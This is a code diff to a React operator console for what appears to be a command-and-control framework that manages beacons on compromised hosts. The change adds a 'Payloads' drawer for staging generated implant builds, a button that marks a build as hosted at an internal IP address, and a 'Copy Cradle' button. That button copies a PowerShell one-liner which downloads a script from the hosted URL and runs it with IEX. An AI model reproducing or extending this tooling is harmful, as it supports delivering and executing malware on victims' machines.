@@ -1,3 +1,4 @@
+import { useBeaconStore } from './BeaconStore'
 import React, { useState, useEffect, useRef, useCallback } from 'react'
 import { useBeaconSocket } from '../../hooks/useBeaconSocket'
 
@@ -190,10 +191,14 @@ function ProcessTable({ raw }: { raw: string }) {
 
 interface OperationsProps {
   token: string
+  onSessionId?: (id: string) => void
 }
 
-export default function Operations({ token }: OperationsProps) {
+export default function Operations({ token, onSessionId }: OperationsProps) {
   const { connected, lastMessage, wsSend, wsSwitchBeacon } = useBeaconSocket(token || null, 'op-chainlink')
+  const { builds: savedBuilds, hostBuild } = useBeaconStore()
+  const [showPayloads, setShowPayloads] = useState(false)
+  const [hostingId, setHostingId] = useState<string | null>(null)
 
   const [beacons,       setBeacons]       = useState<Beacon[]>(SEED_BEACONS)
   const [activeBeacon,  setActiveBeacon]  = useState<Beacon | null>(null)
@@ -244,7 +249,10 @@ export default function Operations({ token }: OperationsProps) {
       console.log('[TZ event]', JSON.stringify(lastMessage))
       if (raw['event_type'] === 'session_init' || eventType === 'session_init') {
         try {
-          const rawBeacons = JSON.parse(raw['output'] as string ?? '[]') as Array<Record<string, string>>
+          const parsed = JSON.parse(raw['output'] as string ?? '{}')
+          const sessId = parsed['sessionId'] as string | undefined
+          if (sessId && onSessionId) onSessionId(sessId)
+          const rawBeacons = (parsed['beacons'] ?? parsed) as Array<Record<string, string>>
           setBeacons(rawBeacons.map(b => ({
             id:           b['id']          ?? '',
             hostname:     b['host']        ?? '',
@@ -302,6 +310,14 @@ export default function Operations({ token }: OperationsProps) {
 
   // live ticker
   useEffect(() => { const id = setInterval(() => setBeacons(bs => [...bs]), 10000); return () => clearInterval(id) }, [])
+
+  async function handleHost(buildId: string, filename: string) {
+    setHostingId(buildId)
+    await new Promise(r => setTimeout(r, 600))
+    const url = `http://10.10.10.5/${filename}`
+    hostBuild(buildId, url)
+    setHostingId(null)
+  }
 
   // auto-scroll
   useEffect(() => { consoleEndRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [lines])
@@ -487,6 +503,14 @@ export default function Operations({ token }: OperationsProps) {
         ))}
 
         <div style={{ flex: 1 }} />
+        <button onClick={() => setShowPayloads(v => !v)} style={{
+          background: showPayloads ? `${C.blue}22` : 'transparent',
+          border: `1px solid ${showPayloads ? C.blue : C.border}`,
+          color: showPayloads ? C.blue : C.dim,
+          cursor: 'pointer', padding: '2px 10px', fontSize: 11, borderRadius: 2, marginRight: 8,
+        }}>
+          Payloads {savedBuilds.length > 0 ? `(${savedBuilds.length})` : ''}
+        </button>
         <span style={{ fontSize: 11, color: C.dim }}>
           sessions: <span style={{ color: C.green, marginRight: 12 }}>{beacons.length}</span>
           {activeBeacon && <span style={{ color: C.yellow }}>active: {activeBeacon.hostname}</span>}
@@ -555,6 +579,80 @@ export default function Operations({ token }: OperationsProps) {
           </tbody>
         </table>
       </div>
+
+      {/* ── Payloads drawer ───────────────────────────────────── */}
+      {showPayloads && (
+        <div style={{ flexShrink: 0, maxHeight: 160, overflow: 'auto', borderTop: `2px solid ${C.blue}`, background: C.panel2 }}>
+          <div style={{
+            position: 'sticky', top: 0, padding: '4px 12px', background: C.panel,
+            borderBottom: `1px solid ${C.border}`, fontSize: 9, color: C.dim,
+            letterSpacing: '0.08em', textTransform: 'uppercase', display: 'flex', alignItems: 'center',
+          }}>
+            <span>⚡ Saved Payloads — {savedBuilds.length}</span>
+            <button onClick={() => setShowPayloads(false)} style={{
+              marginLeft: 'auto', background: 'transparent', border: 'none', color: C.dim, cursor: 'pointer', fontSize: 12,
+            }}>✕</button>
+          </div>
+          {savedBuilds.length === 0 ? (
+            <div style={{ padding: '16px', fontSize: 11, color: C.dim, textAlign: 'center' }}>
+              No payloads — generate one in Beacon Gen
+            </div>
+          ) : (
+            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+              <thead>
+                <tr>
+                  {['ID','Profile','Format','Filename','Status','URL / Cradle',''].map((h, i) => (
+                    <th key={i} style={{ padding: '4px 10px', textAlign: 'left', fontSize: 9, fontWeight: 600,
+                      color: C.dim, background: C.panel, borderBottom: `1px solid ${C.border}`,
+                      textTransform: 'uppercase', letterSpacing: '0.06em', position: 'sticky', top: 28 }}>{h}</th>
+                  ))}
+                </tr>
+              </thead>
+              <tbody>
+                {savedBuilds.map((b, i) => (
+                  <tr key={b.id} style={{ background: i % 2 === 0 ? C.rowEven : C.rowOdd }}>
+                    <td style={{ padding: '5px 10px', fontSize: 11, fontFamily: 'monospace', color: C.mono }}>{b.id}</td>
+                    <td style={{ padding: '5px 10px', fontSize: 11, color: C.dim }}>{b.profileName}</td>
+                    <td style={{ padding: '5px 10px', fontSize: 10, color: C.yellow, fontWeight: 700, textTransform: 'uppercase' }}>{b.format}</td>
+                    <td style={{ padding: '5px 10px', fontSize: 11, fontFamily: 'monospace', color: C.dim }}>{b.filename}</td>
+                    <td style={{ padding: '5px 10px', fontSize: 10 }}>
+                      {b.hostedUrl
+                        ? <span style={{ color: C.green }}>● LIVE</span>
+                        : <span style={{ color: C.dim }}>○ saved</span>}
+                    </td>
+                    <td style={{ padding: '5px 10px', fontSize: 11, fontFamily: 'monospace', color: C.mono }}>
+                      {b.hostedUrl
+                        ? <span style={{ color: C.green, fontSize: 10 }}>{b.hostedUrl}</span>
+                        : <span style={{ color: C.dim, fontStyle: 'italic', fontSize: 10 }}>not hosted</span>}
+                    </td>
+                    <td style={{ padding: '5px 8px', textAlign: 'right' }}>
+                      <div style={{ display: 'flex', gap: 4, justifyContent: 'flex-end' }}>
+                        {!b.hostedUrl && (
+                          <button onClick={() => handleHost(b.id, b.filename)}
+                            disabled={hostingId === b.id}
+                            style={{ background: C.blue, border: 'none', color: '#fff',
+                              cursor: hostingId === b.id ? 'wait' : 'pointer',
+                              padding: '2px 8px', fontSize: 9, borderRadius: 2, fontWeight: 700 }}>
+                            {hostingId === b.id ? '…' : 'HOST'}
+                          </button>
+                        )}
+                        {b.hostedUrl && (
+                          <button onClick={() => navigator.clipboard.writeText(
+                            `(New-Object Net.WebClient).DownloadString('${b.hostedUrl}') | IEX`
+                          )} style={{ background: 'transparent', border: `1px solid ${C.border}`,
+                            color: C.dim, cursor: 'pointer', padding: '2px 6px', fontSize: 9, borderRadius: 2 }}>
+                            Copy Cradle
+                          </button>
+                        )}
+                      </div>
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          )}
+        </div>
+      )}
 
       {/* ── Drag Handle ───────────────────────────────────────── */}
       <div
